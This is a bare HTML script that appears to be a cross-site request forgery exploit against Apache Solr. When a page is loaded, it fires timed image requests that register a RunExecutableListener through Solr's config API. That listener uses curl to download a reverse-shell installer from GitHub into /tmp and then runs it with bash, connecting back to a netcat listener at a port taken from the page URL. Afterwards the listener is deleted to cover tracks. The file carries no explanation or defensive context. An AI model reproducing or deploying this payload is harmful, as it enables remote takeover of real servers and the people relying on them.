<script>
function getUrlVars() {
    var vars = {};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
        vars[key] = value;
    });
    return vars;
}
var portnumber = getUrlVars()["n"];
setTimeout(myFunction1, 1)
function myFunction1() {
  var img = new Image();
  img.src = "http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/config%23&stream.body={%22add-listener%22:{%22event%22:%22postCommit%22,%22name%22:%22newlistener%22,%22class%22:%22solr.RunExecutableListener%22,%22exe%22:%22curl%22,%22dir%22:%22/usr/bin/%22,%22args%22:[%22https://raw.githubusercontent.com/tdwyer/reverse_shells/master/installrevshell%22,%22-o%22,%22/tmp/installrevshell%22]}}&isShard=true"
  img_home.appendChild(img);
}
setTimeout(myFunction2, 200)
function myFunction2() {
  var img = new Image();
  img.src = "http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/config%23&stream.body={%22update-listener%22:{%22event%22:%22postCommit%22,%22name%22:%22newlistener%22,%22class%22:%22solr.RunExecutableListener%22,%22exe%22:%22curl%22,%22dir%22:%22/usr/bin/%22,%22args%22:[%22https://raw.githubusercontent.com/tdwyer/reverse_shells/master/installrevshell%22,%22-o%22,%22/tmp/installrevshell%22]}}&isShard=true"
  img_home.appendChild(img);
}
setTimeout(myFunction3, 400)
function myFunction3() {
  var img = new Image();
  img.src = "http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/update%23&commit=true"
  img_home.appendChild(img);
}
setTimeout(myFunction4, 600)
function myFunction4() {
  var img = new Image();
  img.src = "http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/config%23&stream.body={%22update-listener%22:{%22event%22:%22postCommit%22,%22name%22:%22newlistener%22,%22class%22:%22solr.RunExecutableListener%22,%22exe%22:%22bash%22,%22dir%22:%22/bin/%22,%22args%22:[%22-e%22,%22/tmp/installrevshell%22,%22IP_OF_NETCAT_LISTENER%22,%22" + portnumber + "%22]}}&isShard=true"
  img_home.appendChild(img);
}
setTimeout(myFunction5, 800)
function myFunction5() {
  var img = new Image();
  img.src = "http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/config%23&stream.body={%22add-listener%22:{%22event%22:%22postCommit%22,%22name%22:%22newlistener%22,%22class%22:%22solr.RunExecutableListener%22,%22exe%22:%22bash%22,%22dir%22:%22/bin/%22,%22args%22:[%22-e%22,%22/tmp/installrevshell%22,%22IP_OF_NETCAT_LISTENER%22,%22" + portnumber + "%22]}}&isShard=true"
  img_home.appendChild(img);
}
setTimeout(myFunction6, 1000)
function myFunction6() {
  var img = new Image();
  img.src = "http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/update%23&commit=true"
  img_home.appendChild(img);
}
setTimeout(myFunction7, 1200)
function myFunction7() {
  var img = new Image();
  img.src = "http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/config%23&stream.body={%22delete-listener%22:%22newlistener%22}&isShard=true"
  img_home.appendChild(img);
}
setTimeout(myFunction6, 1400)
function myFunction6() {
  var img = new Image();
  img.src = "http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/update%23&commit=true"
  img_home.appendChild(img);
}
</script> 
